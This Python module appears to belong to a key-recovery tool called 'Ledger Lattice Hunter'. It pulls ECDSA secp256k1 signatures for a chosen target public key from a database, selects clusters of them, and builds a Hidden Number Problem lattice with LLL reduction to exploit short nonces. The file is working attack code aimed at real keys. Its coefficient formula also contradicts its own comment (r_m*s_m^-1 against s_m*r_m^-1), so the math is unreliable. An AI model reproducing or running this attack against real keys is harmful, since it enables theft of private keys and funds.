"""
Lattice Builder for the Ledger Lattice Hunter.

This module is responsible for constructing the lattice matrix based on the
collected signatures and the parameters of the attack.
"""

import logging
from typing import List

import numpy as np
from fpylll import IntegerMatrix, GSO, LLL
from ecdsa import SECP256k1

from ..database.connection import DatabaseConnection
from ..database.models import Signature

logger = logging.getLogger(__name__)

class LatticeBuilder:
    """
    Constructs the lattice for the Hidden Number Problem attack on ECDSA.
    """

    def __init__(self, db: DatabaseConnection, config: dict):
        """
        Initializes the LatticeBuilder.

        Args:
            db: An active database connection.
            config: The project configuration dictionary.
        """
        self.db = db
        self.config = config
        self.q = SECP256k1.order
        self.target_pubkey: str = None
        self.reference_signature: Signature = None

    def get_reference_signature(self) -> Signature:
        """Returns the signature used as a reference in the lattice construction."""
        return self.reference_signature

    def get_target_pubkey(self) -> str:
        """Returns the public key currently being targeted."""
        return self.target_pubkey

    async def build(self, pubkey: str, dimension: int, klen: int, x_param: int) -> GSO.Mat:
        """
        Builds the lattice for a given public key and attack parameters.

        This method implements the lattice construction described in "Attacking
        ECDSA with Nonce Leakage by Lattice Sieving", using a decomposition
        technique to trade samples for a lower lattice dimension.

        Args:
            pubkey: The public key to attack.
            dimension: The desired dimension of the lattice.
            klen: The assumed bit-length of the nonces.
            x_param: The decomposition parameter 'x' from the research paper.

        Returns:
            A fpylll GSO matrix object representing the lattice, or None if
            not enough signatures are available.
        """
        self.target_pubkey = pubkey
        # 1. Fetch a pool of signatures for the target public key.
        # We fetch more than we need to select a "good" set.
        num_signatures_to_fetch = dimension * self.config["lattice"]["sample_selection_factor"]
        signatures = await self.db.get_signatures_for_pubkey(pubkey, limit=num_signatures_to_fetch)

        if len(signatures) < dimension:
            logger.warning(f"Not enough signatures for pubkey {pubkey} to build a {dimension}-dim lattice.")
            return None

        # 2. Select the best `dimension - 1` signatures from the pool.
        # A "good" set of signatures are those with r*s^-1 values that are close to each other.
        # This helps to keep the coefficients in the lattice small.
        selected_signatures = self._select_best_signatures(signatures, dimension - 1)

        # 3. Construct the lattice matrix A
        A = self._construct_lattice_matrix(selected_signatures, dimension, klen, x_param)
        
        # 4. Create a GSO object from the matrix for the solver
        M = GSO.Mat(A, float_type="d")
        LLL.Reduction(M)() # Initial LLL reduction
        return M

    def _select_best_signatures(self, signatures: List[Signature], num_to_select: int) -> List[Signature]:
        """
        Selects a subset of signatures that are most suitable for the lattice attack.
        The best signatures are those that produce small `t_i` coefficients for the HNP.
        """
        if len(signatures) <= num_to_select:
            return signatures

        best_signatures = []
        min_max_t_val = self.q  # Initialize with a large value

        # Iterate through each signature as a potential reference signature
        for i in range(len(signatures)):
            ref_sig = signatures[i]
            r_m = int(ref_sig.r, 16)
            s_m = int(ref_sig.s, 16)
            s_m_inv = pow(s_m, -1, self.q)
            r_m_s_m_inv = (r_m * s_m_inv) % self.q

            t_vals = []
            other_sigs = signatures[:i] + signatures[i+1:]
            
            for sig in other_sigs:
                r_i = int(sig.r, 16)
                s_i = int(sig.s, 16)
                s_i_inv = pow(s_i, -1, self.q)

                t_i = (s_i_inv * r_i * r_m_s_m_inv) % self.q
                # Center t_i around 0
                t_i_centered = t_i if t_i <= self.q // 2 else t_i - self.q
                t_vals.append((abs(t_i_centered), sig))

            # Sort by the absolute value of the centered t_i
            t_vals.sort(key=lambda x: x[0])

            # Check if the smallest `num_to_select` t_i values from this reference are the best we've seen
            current_selection = t_vals[:num_to_select]
            current_max_t = current_selection[-1][0]

            if current_max_t < min_max_t_val:
                min_max_t_val = current_max_t
                # The final set includes the reference signature
                best_signatures = [val[1] for val in current_selection] + [ref_sig]

        logger.info(f"Selected a cluster of {len(best_signatures)} signatures with max |t_i| of {min_max_t_val}")
        return best_signatures

    def _construct_lattice_matrix(self, signatures: List[Signature], d: int, klen: int, x: int) -> IntegerMatrix:
        """
        Constructs the integer matrix for the lattice based on the research paper's methodology.
        """
        m = d - 1  # Number of signatures used
        A = IntegerMatrix(d, d)

        # Use the last signature as the reference signature (m-th signature)
        self.reference_signature = signatures[-1]
        other_sigs = signatures[:-1]

        r_m = int(self.reference_signature.r, 16)
        s_m = int(self.reference_signature.s, 16)
        h_m = int(self.reference_signature.h, 16)

        s_m_inv = pow(s_m, -1, self.q)
        r_m_s_m_inv = (r_m * s_m_inv) % self.q

        # The nonce is assumed to be klen bits long.
        # w is used for the recentering technique.
        w = 2**(klen - 1)
        
        # tau is the embedding factor, chosen optimally as per the paper.
        # We use an integer approximation.
        tau = int(w / np.sqrt(3))

        t_list = []
        a_list = []

        for sig in other_sigs:
            r_i = int(sig.r, 16)
            s_i = int(sig.s, 16)
            h_i = int(sig.h, 16)
            s_i_inv = pow(s_i, -1, self.q)

            # t'_i = s_i^-1 * r_i * (s_m * r_m^-1) mod q
            t_i = (s_i_inv * r_i * r_m_s_m_inv) % self.q
            t_list.append(t_i)
            
            # a'_i = w - t'_i*w - h_i*s_i^-1 + t'_i*h_m*s_m_inv mod q
            # This is derived from the HNP formulation after recentering.
            a_i = (w - (t_i * w) - (h_i * s_i_inv) + (t_i * h_m * s_m_inv)) % self.q
            a_list.append(a_i)
        
        # Populate the matrix A
        # The first d-2 rows set the modulus q
        for i in range(d - 2):
            A[i, i] = self.q

        # The (d-1)-th row contains the t_i coefficients, scaled by x
        for i in range(d - 2):
            A[d-2, i] = x * t_list[i]
        A[d-2, d-2] = x # y-parameter from paper, set to x

        # The d-th row contains the a_i coefficients and the embedding factor tau
        for i in range(d - 2):
            A[d-1, i] = a_list[i]
        # A[d-1, d-2] is 0
        A[d-1, d-1] = tau

        logger.info(f"Constructed a {d}x{d} lattice matrix with x_param={x} and klen={klen}.")
        return A 